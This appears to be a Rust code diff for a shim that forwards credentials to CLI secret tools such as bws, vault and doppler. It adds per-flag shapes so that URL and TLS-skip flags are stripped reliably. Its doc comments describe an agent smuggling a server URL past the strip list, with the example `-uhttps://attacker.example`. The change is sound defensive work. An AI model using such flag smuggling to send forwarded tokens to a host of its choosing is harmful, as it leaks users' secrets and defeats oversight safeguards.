@@ -2,6 +2,129 @@ use super::{MatcherRule, MatchingResolution, NonEmptyVec, SecretMatcher};
 
 pub type CliMatcherRule = MatcherRule<ArgsAndMatcher, ArgsOnly>;
 
+/// One flag entry in a [`CliIntegrationSpec::strip_arg_flags`] /
+/// [`ArgsAndMatcher::strip_arg_flags`] list.
+///
+/// A bare string (`StripFlag::Named`) is shorthand for
+/// `StripFlag::Shaped(FlagShape { flag: <that string>, short: None, value:
+/// FlagValue::SeparateOrEquals })` — the crate's original, single-spelling,
+/// arity-blind heuristic (see [`FlagValue::SeparateOrEquals`]). Reach for
+/// `StripFlag::Shaped` (or the [`StripFlag::shaped`] constructor) instead
+/// when that default shape would get the flag wrong, e.g. to declare:
+/// * a second spelling for the same flag (e.g. `-u` for `--server-url`,
+///   `--tls-skip-verify` for `-tls-skip-verify`),
+/// * that the flag never takes a value at all ([`FlagValue::None`]), so the
+///   arity-blind heuristic must not swallow whatever positional happens to
+///   follow it (e.g. `vault kv get -tls-skip-verify secret/foo` must not
+///   lose `secret/foo`), or
+/// * that a value may be concatenated directly onto a short alias with no
+///   separator at all ([`FlagValue::Concatenated`], getopt-style, e.g.
+///   `-uVALUE`) — a form `SeparateOrEquals`'s exact-token/`flag=value`
+///   matching cannot recognize, letting an agent smuggle the value past an
+///   otherwise-correct stripped-flag list entirely (e.g. `bws secret get id
+///   -uhttps://attacker.example`).
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
+#[serde(untagged)]
+pub enum StripFlag {
+    Named(String),
+    Shaped(FlagShape),
+}
+
+impl StripFlag {
+    /// Builds a [`StripFlag::Shaped`] entry directly, without spelling out
+    /// [`FlagShape`] at each call site.
+    #[must_use]
+    pub fn shaped(flag: &str, short: Option<&str>, value: FlagValue) -> Self {
+        Self::Shaped(FlagShape {
+            flag: String::from(flag),
+            short: short.map(String::from),
+            value,
+        })
+    }
+
+    /// The flag's primary spelling.
+    fn primary(&self) -> &str {
+        match self {
+            Self::Named(flag) => flag,
+            Self::Shaped(shape) => &shape.flag,
+        }
+    }
+
+    /// The flag's additional spelling, if any.
+    fn short(&self) -> Option<&str> {
+        match self {
+            Self::Named(_) => None,
+            Self::Shaped(shape) => shape.short.as_deref(),
+        }
+    }
+
+    /// How this flag's value, if it has one, is attached to it.
+    fn value(&self) -> FlagValue {
+        match self {
+            Self::Named(_) => FlagValue::SeparateOrEquals,
+            Self::Shaped(shape) => shape.value,
+        }
+    }
+}
+
+impl From<&str> for StripFlag {
+    fn from(flag: &str) -> Self {
+        Self::Named(String::from(flag))
+    }
+}
+
+/// The explicit form of [`StripFlag`]: every spelling this flag can appear
+/// as on the command line, and how its value (if any) attaches to it.
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
+pub struct FlagShape {
+    /// The flag's primary spelling, exactly as it appears on the command
+    /// line (e.g. `"--server-url"`, `"-address"`).
+    pub flag: String,
+    /// An additional spelling for the same flag (e.g. `"-u"` for
+    /// `"--server-url"`), matched with the same `value` shape as `flag`,
+    /// except that only `short` is ever eligible for
+    /// [`FlagValue::Concatenated`] matching — see that variant's docs.
+    #[serde(default)]
+    pub short: Option<String>,
+    /// How this flag's value (if any) is attached to it on the command line.
+    #[serde(default)]
+    pub value: FlagValue,
+}
+
+/// How a [`StripFlag`]'s value, if it has one, is attached to it on the
+/// command line.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, serde::Serialize, serde::Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum FlagValue {
+    /// The flag never takes a value: only the bare flag token itself (or
+    /// `flag=value`, since e.g. Go's `flag` package accepts `-boolflag=true`
+    /// for booleans) is ever stripped — nothing after it is consumed.
+    None,
+    /// The historical default: a value follows as its own token (`--flag
+    /// value`) or is joined with `=` (`--flag=value`). Since this crate
+    /// can't otherwise know whether an unlisted flag truly takes a value, an
+    /// unrelated positional immediately following an exact-token match is
+    /// still swallowed as if it were that value — see
+    /// [`CliIntegrationSpec::rewrite_args`] for why that's accepted.
+    #[default]
+    SeparateOrEquals,
+    /// Like `SeparateOrEquals`, but a `short` alias's value may also be
+    /// concatenated directly onto it with no separator at all (getopt-style
+    /// short options, e.g. `-uVALUE`) — a form `SeparateOrEquals` cannot
+    /// recognize (its match is exact-token or `flag=`-prefixed only).
+    ///
+    /// Deliberately never applied to a [`StripFlag`]'s primary `flag`
+    /// spelling, only to `short`: prefix-matching a token against an
+    /// arbitrary flag name can otherwise swallow an unrelated flag that
+    /// merely shares that prefix (e.g. a hypothetical `--server-url-timeout`
+    /// next to a `Concatenated` `--server-url`) — a risk real getopt/clap
+    /// parsers avoid by resolving against a known flag registry, which this
+    /// crate doesn't have. That collision is far less likely for a short,
+    /// single-token alias, so only enable this for a spelling actually
+    /// documented to support concatenation.
+    Concatenated,
+}
+
 /// Per-CLI-tool behavior spec: credentials to forward, command
 /// classification, output normalization, and secret extraction from stdout.
 #[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
@@ -24,9 +147,10 @@ pub struct CliIntegrationSpec {
     /// `-address`/`-tls-skip-verify`) — an agent could otherwise use one of
     /// these on an *otherwise-permitted* command to make the subprocess send
     /// the forwarded `credential_env_vars` token to a host of its choosing,
-    /// regardless of how well-redacted that command's own stdout is.
+    /// regardless of how well-redacted that command's own stdout is. See
+    /// [`StripFlag`] for how to shape an entry beyond a bare flag name.
     #[serde(default)]
-    pub strip_arg_flags: Vec<String>,
+    pub strip_arg_flags: Vec<StripFlag>,
     /// Candidate rules, tried against the invocation's args via
     /// [`CliIntegrationSpec::resolve_args`]. A single binary can emit
     /// different output shapes for different subcommands (e.g. `bws secret
@@ -96,12 +220,12 @@ impl CliIntegrationSpec {
     /// `args`.
     ///
     /// For a `SensitiveCommand` match: strips [`Self::strip_arg_flags`]
-    /// and the rule's own `strip_arg_flags` entries (both `--flag value` and
-    /// `--flag=value` forms), then appends its `forced_args`. Different
-    /// sensitive commands on the same binary can require different forced
-    /// output shapes (e.g. `doppler secrets download` forces `--format json
-    /// --no-file`, while bare `doppler secrets` forces `--json` and strips
-    /// `--raw`), so those live on the rule rather than the spec.
+    /// and the rule's own `strip_arg_flags` entries, then appends its
+    /// `forced_args`. Different sensitive commands on the same binary can
+    /// require different forced output shapes (e.g. `doppler secrets
+    /// download` forces `--format json --no-file`, while bare `doppler
+    /// secrets` forces `--json` and strips `--raw`), so those live on the
+    /// rule rather than the spec.
     ///
     /// For a `SafeCommand` match: strips [`Self::strip_arg_flags`]
     /// only — a pass-through command has no `forced_args`/`strip_arg_flags`
@@ -113,18 +237,10 @@ impl CliIntegrationSpec {
     /// rule matches — there's nothing to rewrite for a blocked invocation,
     /// since it's never executed.
     ///
-    /// A stripped `--flag value` pair's trailing token is only consumed as
-    /// the flag's value when it doesn't itself look like a flag (start with
-    /// `-`) and isn't one of the matched rule's own `args_match` tokens, so
-    /// stripping a valueless flag never swallows an unrelated flag, nor a
-    /// subcommand word that `resolve_args` relied on to select this very
-    /// rule, that happens to follow it — mirroring the same protection
-    /// [`args_matches`] already applies while matching. The flags-to-strip
-    /// list carries no per-flag arity, though, so this is a syntactic
-    /// heuristic, not true arity awareness: a valueless flag immediately
-    /// followed by a plain positional that is neither a flag nor an
-    /// `args_match` token is still treated as if that positional were its
-    /// value, and both are removed.
+    /// How a stripped flag's trailing token is (or isn't) treated as its
+    /// value is governed by that [`StripFlag`]'s [`FlagValue`] shape — see
+    /// [`strip_flags_from_args`] and [`FlagValue`]'s variants for the exact
+    /// rules, including the arity-blind default's known limitation.
     #[must_use]
     pub fn rewrite_args(&self, args: &[String]) -> Vec<String> {
         if let Some(rule) = self
@@ -153,30 +269,89 @@ impl CliIntegrationSpec {
     }
 }
 
-/// Removes every occurrence of any flag in `flags_to_strip` from `args` (both
-/// `--flag value` and `--flag=value` forms). `protected_tokens` (a matched
-/// rule's own `args_match`) is never consumed as a stripped flag's value —
-/// see [`CliIntegrationSpec::rewrite_args`] for why.
+/// Whether/how a single arg token matched a [`StripFlag`].
+enum FlagTokenMatch {
+    /// The token's value (if any) is embedded in the token itself — either
+    /// `flag=value`, or, for a `short` alias shaped
+    /// [`FlagValue::Concatenated`], `flag` immediately followed by the value
+    /// with no separator at all (e.g. `-uVALUE`). Nothing else is consumed.
+    WholeToken,
+    /// The token is exactly one of the flag's spellings, with no value
+    /// embedded in it — the *next* token may still be consumed as this
+    /// flag's value, per [`strip_flags_from_args`]'s rules.
+    ExactSpelling,
+}
+
+/// Matches `arg` against every spelling of `strip_flag`, returning how (if
+/// at all) it matched. See [`FlagTokenMatch`] and [`FlagValue`] for what each
+/// outcome means.
+fn match_flag_token(arg: &str, strip_flag: &StripFlag) -> Option<FlagTokenMatch> {
+    if let Some(matched) = match_spelling(arg, strip_flag.primary(), false) {
+        return Some(matched);
+    }
+    let short = strip_flag.short()?;
+    match_spelling(arg, short, strip_flag.value() == FlagValue::Concatenated)
+}
+
+/// Matches a single spelling of a flag against `arg`. `allow_concatenated`
+/// additionally recognizes `spelling` immediately followed by a value with
+/// no separator (getopt-style, e.g. `-uVALUE`) — deliberately only ever
+/// passed `true` for a [`StripFlag`]'s `short` alias; see
+/// [`FlagValue::Concatenated`]'s docs for why the primary spelling never
+/// gets this treatment.
+fn match_spelling(arg: &str, spelling: &str, allow_concatenated: bool) -> Option<FlagTokenMatch> {
+    if arg == spelling {
+        return Some(FlagTokenMatch::ExactSpelling);
+    }
+    let rest = arg.strip_prefix(spelling)?;
+    if rest.starts_with('=') || (allow_concatenated && !rest.is_empty()) {
+        return Some(FlagTokenMatch::WholeToken);
+    }
+    None
+}
+
+/// Removes every occurrence of any flag in `flags_to_strip` from `args`, per
+/// each entry's [`StripFlag`] shape. `protected_tokens` (a matched rule's
+/// own `args_match`) is never consumed as a stripped flag's value — see
+/// [`CliIntegrationSpec::rewrite_args`] for why.
+///
+/// An `ExactSpelling` match's trailing token is only consumed as the flag's
+/// value when the flag's [`FlagValue`] isn't `None`, and even then only when
+/// that trailing token doesn't itself look like a flag (start with `-`) and
+/// isn't one of `protected_tokens` — a subcommand word that `resolve_args`
+/// relied on to select the very rule this stripping happens for, that
+/// happens to follow it. `FlagValue::SeparateOrEquals` (the shape a bare
+/// [`StripFlag::Named`] entry gets) carries no true arity awareness, though:
+/// a flag declared that way, immediately followed by a plain positional that
+/// is neither a flag nor a protected token, still has that positional
+/// swallowed as if it were the flag's value, even if the flag never actually
+/// takes one. Declare the flag as [`StripFlag::Shaped`] with
+/// `FlagValue::None` to opt out of that and preserve the following
+/// positional instead.
 fn strip_flags_from_args(
     args: &[String],
-    flags_to_strip: &[String],
+    flags_to_strip: &[StripFlag],
     protected_tokens: &[String],
 ) -> Vec<String> {
     let mut rewritten = Vec::with_capacity(args.len());
     let mut iter = args.iter().peekable();
     while let Some(arg) = iter.next() {
-        let flag = arg.split('=').next().unwrap_or(arg.as_str());
-        if flags_to_strip.iter().any(|f| f == flag) {
-            if !arg.contains('=')
-                && iter
-                    .peek()
-                    .is_some_and(|next| !next.starts_with('-') && !protected_tokens.contains(next))
-            {
-                iter.next();
-            }
+        let Some((strip_flag, matched)) = flags_to_strip
+            .iter()
+            .find_map(|flag| match_flag_token(arg, flag).map(|matched| (flag, matched)))
+        else {
+            rewritten.push(arg.clone());
             continue;
+        };
+
+        if matches!(matched, FlagTokenMatch::ExactSpelling)
+            && strip_flag.value() != FlagValue::None
+            && iter
+                .peek()
+                .is_some_and(|next| !next.starts_with('-') && !protected_tokens.contains(next))
+        {
+            iter.next();
         }
-        rewritten.push(arg.clone());
     }
     rewritten
 }
@@ -192,12 +367,12 @@ pub struct ArgsAndMatcher {
     /// How to extract `(name, value)` pairs from the tool's stdout.
     pub matcher: SecretMatcher,
     /// Arg flags to strip from the shim's requested args when this rule is
-    /// selected, before appending `forced_args`. Both `--flag value`
-    /// (two-token) and `--flag=value` (single-token) forms are matched — see
-    /// [`CliIntegrationSpec::rewrite_args`] for exactly how a two-token
-    /// pair's trailing value is recognized. Example: `vec!["--format"]`.
+    /// selected, before appending `forced_args`. See [`StripFlag`] for the
+    /// per-entry shape (bare name vs. explicit spellings/value form) and
+    /// [`CliIntegrationSpec::rewrite_args`] for exactly how a flag's
+    /// trailing value is recognized. Example: `vec![StripFlag::from("--format")]`.
     #[serde(default)]
-    pub strip_arg_flags: Vec<String>,
+    pub strip_arg_flags: Vec<StripFlag>,
     /// Args appended to the subprocess command when this rule is selected,
     /// after stripping. Used to force a specific output format that
     /// `matcher` expects. Example: `vec!["--format", "json"]`.
